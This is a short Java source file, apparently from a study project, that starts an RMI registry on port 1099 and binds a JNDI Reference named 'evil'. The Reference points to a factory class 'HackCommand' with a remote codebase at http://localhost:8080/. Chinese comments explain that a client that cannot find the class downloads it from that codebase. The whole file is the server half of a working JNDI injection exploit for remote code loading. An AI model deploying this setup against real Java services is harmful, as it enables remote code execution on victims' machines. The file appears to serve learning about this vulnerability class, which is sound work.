package edu.changda.jndi.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.registry.LocateRegistry;

public class RmiServer {
  public static void main(String[] args) throws IOException, NamingException, AlreadyBoundException {
    // 创建一个 Reference，第一个参数无所谓，第二个参数指定 Object Factory 的类名：
    // 第三个参数是codebase，表明如果客户端在classpath里面找不到则去http://localhost:8080/下载
    Reference reference = new Reference("test",
      "edu.changda.jndi.rmi.HackCommand",
      "http://localhost:8080/");
    // 因为只为只有实现 Remote 接口的对象才能绑定到 rmi registry 里面去
    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
    // 在本机 1099 端口开启 rmi registry，可以通过 JNDI API 来访问此 rmi registry
    LocateRegistry.createRegistry(1099).bind("evil", referenceWrapper);
  }
}